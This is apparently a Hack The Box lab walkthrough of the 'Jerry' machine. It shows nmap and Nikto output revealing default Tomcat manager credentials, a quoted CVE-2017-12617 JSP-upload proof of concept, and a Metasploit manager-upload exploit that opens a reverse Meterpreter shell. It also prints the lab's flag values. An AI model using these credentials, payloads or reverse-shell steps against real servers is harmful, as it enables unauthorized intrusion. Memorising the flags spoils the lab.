# Jerry

## where you at

10.10.10.95

## what you got

```
# Nmap 7.80 scan initiated Thu Jan 23 21:59:39 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/Jerry/scans/full_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/Jerry/scans/full_tcp.gnmap 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.020s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   21.46 ms 10.10.14.1
2   22.07 ms 10.10.10.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 23 22:01:30 2020 -- 1 IP address (1 host up) scanned in 110.94 seconds
```

### Tomcat 8080


```
- Nikto v2.1.6/2.1.5
+ No web server found on 10.10.10.95:80
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.95
+ Target Port: 8080
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-39272: GET /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: GET HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: GET HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ MISDLEZU Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ GET /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: GET /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ GET Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ GET /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ GET /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ GET /manager/status: Tomcat Server Status interface found (pass protected)

``` 

default creds for for /manager

tomcat:s3cret

http://10.10.10.95:8080/manager/status  
http://10.10.10.95:8080/manager/status


```
Apache Tomcat/7.0.88
JVM 1.8.0_171-b11
Windows Server 2012 R2 6.3 amd64
PUT enabled
```


Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1) 
```
# E-DB Note: https://www.alphabot.com/security/blog/2017/java/Apache-Tomcat-RCE-CVE-2017-12617.html

When running on Windows with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. 
This JSP could then be requested and any code it contained would be executed by the server.

    The PoC is like this:
    
    PUT /1.jsp/ HTTP/1.1
    Host: 192.168.3.103:8080
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://192.168.3.103:8080/examples/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2
    Cookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94
    Connection: close
    Content-Length: 26
    
    <% out.println("hello");%>

It is the bypass for CVE-2017-12615
```

https://www.exploit-db.com/exploits/42966

```
root@kali:/mnt/hgfs/_shared_folder/htb/boxes/Jerry# python tomcat.py -u http://10.10.10.95:8080/



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]


Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617 
```

```
msf5 exploit(multi/http/tomcat_mgr_upload) > set lhost tun0                                                                                                                                                       
lhost => tun0                                                                                                                                                                                                     
msf5 exploit(multi/http/tomcat_mgr_upload) > set lport 8000                                                                                                                                                       
lport => 8000                                                                                                                                                                                                     
msf5 exploit(multi/http/tomcat_mgr_upload) > run                                                                                                                                                                  
                                                                                                                                                                                                                  
[*] Started reverse TCP handler on 10.10.14.23:8000                                                                                                                                                               
[*] Retrieving session ID and CSRF token...                                                                                                                                                                       
[*] Uploading and deploying a9s3TMHp9xeIwkwE...                                                                                                                                                                   
[*] Executing a9s3TMHp9xeIwkwE...                                                                                                                                                                                 
[*] Undeploying a9s3TMHp9xeIwkwE ...                                                                                                                                                                              
[*] Sending stage (53906 bytes) to 10.10.10.95                                                           
[*] Meterpreter session 1 opened (10.10.14.23:8000 -> 10.10.10.95:49192) at 2020-01-23 22:34:43 +0100    
                                                                                                         
meterpreter > getuid                                                                                     
Server username: JERRY$ 

C:\Users\Administrator\Desktop\flags>dir                                                                 
dir                                                                                                      
 Volume in drive C has no label.                                                                                                                                                                                  
 Volume Serial Number is FC2B-E489                                                                       
                                                                                                         
 Directory of C:\Users\Administrator\Desktop\flags                                                                                                                                                                
                                                                                                         
06/19/2018  06:09 AM    <DIR>          .                                                                 
06/19/2018  06:09 AM    <DIR>          ..                                                                
06/19/2018  06:11 AM                88 2 for the price of 1.txt                                          
               1 File(s)             88 bytes                                                            
               2 Dir(s)  27,545,739,264 bytes free                                                       
                                                                                                         
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"                                     
type "2 for the price of 1.txt"                                                                          
user.txt                                                                                                 
7004dbcef0f854e0fb401875f26ebd00                                                                         
                                                                                                         
root.txt                                                                                                                                                                                                          
04a8b36e1545a455393d067e772fe90e  
```

